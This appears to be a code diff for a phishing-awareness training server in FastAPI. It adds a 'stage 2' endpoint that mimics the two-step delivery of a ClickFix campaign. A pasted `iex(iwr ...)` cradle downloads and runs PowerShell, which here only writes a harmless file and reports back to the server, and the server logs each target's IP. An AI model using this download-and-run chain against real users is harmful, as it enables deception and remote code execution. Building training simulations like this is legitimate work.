@@ -7,14 +7,16 @@ một HTTP GET request — không chạy lệnh độc hại nào.
 """
 from __future__ import annotations
 
+import re
 import time
 from threading import Lock
 from typing import Dict, Optional
 
 from fastapi import APIRouter, Query, Request
-from fastapi.responses import JSONResponse
+from fastapi.responses import JSONResponse, PlainTextResponse
 
 router = APIRouter(prefix="/api/clickfix", tags=["clickfix"])
+TOKEN_RE = re.compile(r"^[A-Za-z0-9_\-]{1,64}$")
 
 # In-memory store cho môi trường training. Nếu muốn scale,
 # thay bằng Redis hoặc DB.
@@ -31,6 +33,44 @@ def _gc_expired() -> None:
     expired = [k for k, v in _VERIFY_STORE.items() if now - v["created_at"] > _TOKEN_TTL_SECONDS]
     for k in expired:
         _VERIFY_STORE.pop(k, None)
+
+
+@router.get("/s", response_class=PlainTextResponse)
+async def clickfix_stage2(
+    request: Request,
+    t: str = Query(..., description="Token sinh ra từ frontend register form"),
+):
+    """
+    Stage-2 của payload ClickFix (2 giai đoạn như campaign thật):
+    payload trên clipboard chỉ là cradle ngắn `iex(iwr '<url>/s?t=...')`,
+    script này được tải về và chạy hidden trên máy user.
+
+    Nội dung 100% vô hại: tạo C:\Temp\hehehe.txt ('Hehehehe') rồi
+    gọi /api/clickfix/verify. Ghi lại dấu vết 'downloaded' để instructor
+    thấy được ai đã tải payload kể cả khi chưa chạy.
+    """
+    token = (t or "").strip()
+    if not TOKEN_RE.match(token):
+        return PlainTextResponse("Write-Error 'bad token'", status_code=400)
+
+    client_ip = request.client.host if request.client else "unknown"
+    origin = str(request.base_url).rstrip("/")
+    with _STORE_LOCK:
+        _gc_expired()
+        entry = _VERIFY_STORE.get(token) or {"created_at": time.time(), "verified": False}
+        entry["downloaded_at"] = time.time()
+        entry["client_ip"] = client_ip
+        _VERIFY_STORE[token] = entry
+
+    print(f"[CLICKFIX] ⬇ DOWNLOAD token={token} ip={client_ip}", flush=True)
+
+    script = (
+        "$ErrorActionPreference='SilentlyContinue'\n"
+        "New-Item 'C:\\Temp' -ItemType Directory -Force|Out-Null\n"
+        "Set-Content 'C:\\Temp\\hehehe.txt' 'Hehehehe'\n"
+        f"Invoke-WebRequest '{origin}/api/clickfix/verify?t={token}' -UseBasicParsing|Out-Null\n"
+    )
+    return PlainTextResponse(script, media_type="text/plain")
 
 
 @router.get("/verify")
@@ -112,6 +152,7 @@ async def clickfix_stats():
             {
                 "token": k,
                 "verified": v.get("verified", False),
+                "downloaded_at": v.get("downloaded_at"),
                 "verified_at": v.get("verified_at"),
                 "client_ip": v.get("client_ip"),
                 "user_agent": v.get("user_agent", "")[:100],
